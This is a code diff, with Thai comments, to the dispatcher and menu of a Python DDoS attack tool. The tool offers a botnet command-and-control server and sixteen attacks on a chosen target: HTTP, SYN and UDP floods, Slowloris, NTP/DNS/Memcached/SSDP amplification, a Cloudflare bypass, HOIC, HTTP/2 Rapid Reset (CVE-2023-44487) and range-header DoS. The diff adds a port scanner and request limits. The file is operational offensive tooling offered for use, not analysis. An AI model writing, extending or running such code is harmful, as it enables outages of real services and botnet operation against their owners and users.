@@ -1,5 +1,7 @@
 import threading  # นำเข้าโมดูล threading สำหรับการทำงานแบบมัลติเธรด
 import socket  # นำเข้าโมดูล socket สำหรับการเชื่อมต่อเครือข่าย
+import asyncio  # นำเข้าโมดูล asyncio สำหรับการทำงานแบบ async
+import os  # นำเข้าโมดูล os สำหรับจัดการไฟล์และระบบปฏิบัติการ
 from .config import CONFIG  # นำเข้าการตั้งค่าจาก config
 from .utils import load_file_lines  # นำเข้าฟังก์ชันโหลดไฟล์
 from .security import (  # นำเข้าฟังก์ชันความปลอดภัย
@@ -15,7 +17,7 @@ from .attacks import (  # นำเข้าฟังก์ชันโจมต
 )
 
 
-# Botnet C2 Server  # คอมเมนต์ภาษาอังกฤษสำหรับคลาส
+# Botnet C2 Server  # สำหรับคลาส
 class BotnetC2:  # คลาสสำหรับเซิร์ฟเวอร์ Command and Control
     def __init__(self, host='0.0.0.0', port=6667):  # เมธอดเริ่มต้นของคลาส
         self.host = host  # เก็บค่า host
@@ -67,7 +69,7 @@ class BotnetC2:  # คลาสสำหรับเซิร์ฟเวอร�
 
 
 class Menu:  # คลาสสำหรับระบบเมนู
-    """Menu system for the DDoS tool"""  # คอมเมนต์ภาษาอังกฤษของคลาส
+    """Menu system for the DDoS tool"""  # ของคลาส
 
     ATTACKS = {  # พจนานุกรมเก็บข้อมูลการโจมตีต่างๆ
         "1": {"name": "Layer 7 HTTP Flood (Basic)", "func": "http_flood", "needs_root": False},  # การโจมตี HTTP พื้นฐาน
@@ -85,12 +87,13 @@ class Menu:  # คลาสสำหรับระบบเมนู
         "13": {"name": "HOIC (High Orbit Ion Cannon) Attack", "func": "hoic_attack", "needs_root": False},  # การโจมตี HOIC
         "14": {"name": "HTTP/2 Rapid Reset (CVE-2023-44487)", "func": "http2_rapid_reset", "needs_root": False},  # การโจมตี HTTP/2 Rapid Reset
         "15": {"name": "Apache Range Header DoS", "func": "apache_killer", "needs_root": False},  # การโจมตี Apache Killer
-        "16": {"name": "Nginx Range Header DoS", "func": "nginx_range_dos", "needs_root": False}  # การโจมตี Nginx Range DoS
+        "16": {"name": "Nginx Range Header DoS", "func": "nginx_range_dos", "needs_root": False},  # การโจมตี Nginx Range DoS
+        "17": {"name": "Port Scanner", "func": "port_scanner", "needs_root": False}  # เครื่องมือสแกนพอร์ต
     }
 
     @staticmethod  # decorator สำหรับเมธอด static
     def display():  # เมธอดแสดงเมนู
-        """Display the attack menu"""  # คอมเมนต์ภาษาอังกฤษของเมธอด
+        """Display the attack menu"""  # ของเมธอด
         print("\nSelect Attack Type:")  # แสดงข้อความเลือกประเภทการโจมตี
         for key, attack in Menu.ATTACKS.items():  # วนลูปแสดงรายการการโจมตี
             print(f"{key}. {attack['name']}")  # แสดงตัวเลือก
@@ -98,9 +101,9 @@ class Menu:  # คลาสสำหรับระบบเมนู
 
     @staticmethod  # decorator สำหรับเมธอด static
     def get_attack_params(choice):  # เมธอดรับพารามิเตอร์การโจมตี
-        """Get attack parameters based on choice"""  # คอมเมนต์ภาษาอังกฤษของเมธอด
+        """Get attack parameters based on choice"""  # ของเมธอด
         if choice == "7":  # ถ้าเลือก C2 server
-            # Special case for C2 server  # คอมเมนต์ภาษาอังกฤษ
+            # Special case for C2 server  # 
             try:  # ลองแปลงพอร์ตเป็นตัวเลข
                 c2_port_input = input("C2 Port (default 6667): ").strip()  # รับพอร์ต C2
                 c2_port = int(c2_port_input) if c2_port_input else CONFIG['C2_DEFAULT_PORT']  # แปลงเป็น int หรือใช้ค่าเริ่มต้น
@@ -111,7 +114,7 @@ class Menu:  # คลาสสำหรับระบบเมนู
                 return None  # คืนค่า None
             return {"c2_port": c2_port}  # คืนค่าพารามิเตอร์
 
-        # Standard parameters with validation  # คอมเมนต์ภาษาอังกฤษสำหรับพารามิเตอร์ปกติพร้อมการตรวจสอบ
+        # Standard parameters with validation  # สำหรับพารามิเตอร์ปกติพร้อมการตรวจสอบ
         target = input("Target (IP or URL): ").strip()  # รับเป้าหมาย
         if not target:  # ถ้าเป้าหมายว่าง
             print("Target cannot be empty!")  # แสดงข้อความผิดพลาด
@@ -143,7 +146,7 @@ class Menu:  # คลาสสำหรับระบบเมนู
 
         proxy_file = input(f"Proxy file ({CONFIG['PROXY_FILE']}) or leave empty: ").strip()  # รับไฟล์พร็อกซี
 
-        # Validate proxy file path  # คอมเมนต์ภาษาอังกฤษสำหรับตรวจสอบไฟล์พร็อกซี
+        # Validate proxy file path  # สำหรับตรวจสอบไฟล์พร็อกซี
         proxies = []  # เริ่มต้นลิสต์พร็อกซีว่าง
         if proxy_file:  # ถ้ามีไฟล์พร็อกซี
             import os  # นำเข้าโมดูล os
@@ -164,110 +167,104 @@ class Menu:  # คลาสสำหรับระบบเมนู
 
 
 class AttackDispatcher:  # คลาสสำหรับจัดการการโจมตี
-    """Handles attack execution"""  # คอมเมนต์ภาษาอังกฤษของคลาส
+    """Handles attack execution"""  # ของคลาส
 
     @staticmethod  # decorator สำหรับเมธอด static
-    def execute(choice, params):  # เมธอดดำเนินการโจมตี
-        """Execute the selected attack"""  # คอมเมนต์ภาษาอังกฤษของเมธอด
+    def execute(choice, params, monitor=None):  # เมธอดดำเนินการโจมตี
+        """Execute the selected attack"""  # ของเมธอด
         attack_info = Menu.ATTACKS.get(choice)  # รับข้อมูลการโจมตีจากเมนู
         if not attack_info:  # ถ้าไม่พบข้อมูล
             print("Invalid choice!")  # แสดงข้อความเลือกไม่ถูกต้อง
             return  # ออกจากฟังก์ชัน
 
-        # Check root privileges if needed  # คอมเมนต์ภาษาอังกฤษ
+        # Check root privileges if needed  # 
         from utils import check_root_privileges  # นำเข้าฟังก์ชันตรวจสอบสิทธิ์
         if attack_info["needs_root"] and not check_root_privileges():  # ถ้าต้องการ root และไม่มีสิทธิ์
             print(f"{attack_info['name']} requires root privileges!")  # แสดงข้อความต้องการสิทธิ์ root
             return  # ออกจากฟังก์ชัน
 
-        # Validate parameters  # คอมเมนต์ภาษาอังกฤษสำหรับตรวจสอบพารามิเตอร์
+        # Validate parameters  # สำหรับตรวจสอบพารามิเตอร์
         if params is None:  # ถ้าพารามิเตอร์เป็น None
             print("Invalid parameters provided!")  # แสดงข้อความพารามิเตอร์ไม่ถูกต้อง
             return  # ออกจากฟังก์ชัน
 
-        # Check system resources before attack  # คอมเมนต์ภาษาอังกฤษสำหรับตรวจสอบทรัพยากรระบบก่อนโจมตี
+        # Check system resources before attack  # สำหรับตรวจสอบทรัพยากรระบบก่อนโจมตี
         if not check_system_resources():  # ถ้าทรัพยากรระบบไม่เพียงพอ
             print("System resources are too low to start attack!")  # แสดงข้อความทรัพยากรไม่เพียงพอ
             return  # ออกจากฟังก์ชัน
 
-        # Start resource monitoring  # คอมเมนต์ภาษาอังกฤษสำหรับเริ่มการตรวจสอบทรัพยากร
-        monitor = ResourceMonitor()  # สร้างออบเจ็กต์ตรวจสอบทรัพยากร
-        monitor.start_monitoring()  # เริ่มการตรวจสอบ
+        # Special cases  # สำหรับกรณีพิเศษ
+        if choice == "7":  # ถ้าเลือก C2 server
+            c2 = BotnetC2(port=params["c2_port"])  # สร้างออบเจ็กต์ C2
+            try:  # ลองเริ่มเซิร์ฟเวอร์
+                c2.start_server()  # เริ่มเซิร์ฟเวอร์ C2
+            except KeyboardInterrupt:  # จัดการ Ctrl+C
+                print("C2 server stopped")  # แสดงข้อความหยุดเซิร์ฟเวอร์
+            return  # ออกจากฟังก์ชัน
 
-        try:  # ลองดำเนินการโจมตี
-            # Prepare target URL/IP  # คอมเมนต์ภาษาอังกฤษสำหรับเตรียมเป้าหมาย
-            target = params["target"]  # รับค่าเป้าหมาย
-            port = params["port"]  # รับค่าพอร์ต
-            duration = params["duration"]  # รับค่าระยะเวลา
-            threads = params["threads"]  # รับค่าจำนวนเธรด
-            proxies = params["proxies"]  # รับค่ารายการพร็อกซี
+        # Prepare target URL/IP  # สำหรับเตรียมเป้าหมาย
+        target = params["target"]  # รับค่าเป้าหมาย
+        port = params["port"]  # รับค่าพอร์ต
+        duration = params["duration"]  # รับค่าระยะเวลา
+        threads = params["threads"]  # รับค่าจำนวนเธรด
+        proxies = params["proxies"]  # รับค่ารายการพร็อกซี
+        max_requests = params.get("max_requests", 0)  # รับค่าจำนวนการยิงสูงสุด
 
-            # Execute attack  # คอมเมนต์ภาษาอังกฤษสำหรับดำเนินการโจมตี
-            if choice == "1":  # ถ้าเลือก HTTP Flood พื้นฐาน
-                url = target if target.startswith("http") else f"http://{target}"  # เตรียม URL
-                for _ in range(threads):  # วนลูปตามจำนวนเธรด
-                    increment_thread_counter()  # เพิ่มตัวนับเธรด
-                    threading.Thread(target=http_flood, args=(url, duration, proxies), daemon=True).start()  # เริ่มเธรดโจมตี
+        # Execute attack  # สำหรับดำเนินการโจมตี
+        if choice == "1":  # ถ้าเลือก HTTP Flood พื้นฐาน
+            url = target if target.startswith("http") else f"http://{target}"  # เตรียม URL
+            for _ in range(threads):  # วนลูปตามจำนวนเธรด
+                increment_thread_counter()  # เพิ่มตัวนับเธรด
+                threading.Thread(target=http_flood, args=(url, duration, proxies, monitor, max_requests), daemon=True).start()  # เริ่มเธรดโจมตี
 
-            elif choice == "2":  # ถ้าเลือก Async HTTP Flood
-                url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
-                asyncio.run(async_http_flood(url, duration, proxies))  # รัน async function
+        elif choice == "2":  # ถ้าเลือก Async HTTP Flood
+            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
+            asyncio.run(async_http_flood(url, duration, proxies, monitor, max_requests))  # รัน async function
 
-            elif choice == "3":  # ถ้าเลือก SYN Flood
-                for _ in range(threads):  # วนลูปตามจำนวนเธรด
-                    increment_thread_counter()  # เพิ่มตัวนับเธรด
-                    threading.Thread(target=syn_flood, args=(target, port, duration), daemon=True).start()  # เริ่มเธรดโจมตี
+        elif choice == "3":  # ถ้าเลือก SYN Flood
+            for _ in range(threads):  # วนลูปตามจำนวนเธรด
+                increment_thread_counter()  # เพิ่มตัวนับเธรด
+                threading.Thread(target=syn_flood, args=(target, port, duration, monitor, max_requests), daemon=True).start()  # เริ่มเธรดโจมตี
 
-            elif choice == "4":  # ถ้าเลือก UDP Flood
-                for _ in range(threads):  # วนลูปตามจำนวนเธรด
-                    increment_thread_counter()  # เพิ่มตัวนับเธรด
-                    threading.Thread(target=udp_flood, args=(target, port, duration), daemon=True).start()  # เริ่มเธรดโจมตี
+        elif choice == "4":  # ถ้าเลือก UDP Flood
+            for _ in range(threads):  # วนลูปตามจำนวนเธรด
+                increment_thread_counter()  # เพิ่มตัวนับเธรด
+                threading.Thread(target=udp_flood, args=(target, port, duration, monitor, max_requests), daemon=True).start()  # เริ่มเธรดโจมตี
 
-            elif choice == "5":  # ถ้าเลือก Slowloris Attack
-                slowloris_attack(target, port, duration, threads)  # เรียกฟังก์ชันโจมตี
+        elif choice == "5":  # ถ้าเลือก Slowloris Attack
+            slowloris_attack(target, port, duration, threads)  # เรียกฟังก์ชันโจมตี
 
-            elif choice == "6":  # ถ้าเลือก NTP Amplification
-                ntp_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี
+        elif choice == "6":  # ถ้าเลือก NTP Amplification
+            ntp_amplification(target, port, duration, monitor, max_requests)  # เรียกฟังก์ชันโจมตี
 
-            elif choice == "8":  # ถ้าเลือก Cloudflare Bypass
-                url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
-                cloudflare_bypass_flood(url, duration, proxies)  # เรียกฟังก์ชันโจมตี
+        elif choice == "8":  # ถ้าเลือก Cloudflare Bypass
+            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
+            cloudflare_bypass_flood(url, duration, proxies, monitor, max_requests)  # เรียกฟังก์ชันโจมตี
 
-            elif choice == "9":  # ถ้าเลือก Memcached Amplification
-                memcached_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี
+        elif choice == "9":  # ถ้าเลือก Memcached Amplification
+            memcached_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี
 
-            elif choice == "10":  # ถ้าเลือก SSDP Amplification
-                ssdp_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี
+        elif choice == "10":  # ถ้าเลือก SSDP Amplification
+            ssdp_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี
 
-            elif choice == "11":  # ถ้าเลือก DNS Amplification
-                dns_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี
+        elif choice == "11":  # ถ้าเลือก DNS Amplification
+            dns_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี
 
-            elif choice == "12":  # ถ้าเลือก RUDY Attack
-                rudy_attack(target, port, duration)  # เรียกฟังก์ชันโจมตี
+        elif choice == "12":  # ถ้าเลือก RUDY Attack
+            rudy_attack(target, port, duration)  # เรียกฟังก์ชันโจมตี
 
-            elif choice == "13":  # ถ้าเลือก HOIC Attack
-                url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
-                hoic_attack(url, duration, proxies)  # เรียกฟังก์ชันโจมตี
+        elif choice == "13":  # ถ้าเลือก HOIC Attack
+            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
+            hoic_attack(url, duration, proxies)  # เรียกฟังก์ชันโจมตี
 
-            elif choice == "14":  # ถ้าเลือก HTTP/2 Rapid Reset
-                url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
-                http2_rapid_reset(url, duration, proxies)  # เรียกฟังก์ชันโจมตี
+        elif choice == "14":  # ถ้าเลือก HTTP/2 Rapid Reset
+            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
+            http2_rapid_reset(url, duration, proxies)  # เรียกฟังก์ชันโจมตี
 
-            elif choice == "15":  # ถ้าเลือก Apache Killer
-                url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
-                apache_killer(url, duration, proxies)  # เรียกฟังก์ชันโจมตี
+        elif choice == "15":  # ถ้าเลือก Apache Killer
+            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
+            apache_killer(url, duration, proxies)  # เรียกฟังก์ชันโจมตี
 
-            elif choice == "16":  # ถ้าเลือก Nginx Range DoS
-                url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
-                nginx_range_dos(url, duration, proxies)  # เรียกฟังก์ชันโจมตี
-
-            print(f"Attack started! Monitoring resources...")  # แสดงข้อความเริ่มโจมตี
-            print("Press Ctrl+C to stop.")  # แสดงวิธีหยุด
-
-            # Wait for attack duration  # คอมเมนต์ภาษาอังกฤษสำหรับรอระยะเวลาโจมตี
-            import time  # นำเข้าโมดูล time
-            time.sleep(duration)  # รอตามระยะเวลาที่กำหนด
-
-        finally:  # ทำงานเสมอหลังการโจมตี
-            monitor.stop_monitoring()  # หยุดการตรวจสอบทรัพยากร
-            print("Attack completed. Resource monitoring stopped.")  # แสดงข้อความเสร็จสิ้น
+        elif choice == "16":  # ถ้าเลือก Nginx Range DoS
+            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
+            nginx_range_dos(url, duration, proxies)  # เรียกฟังก์ชันโจมตี
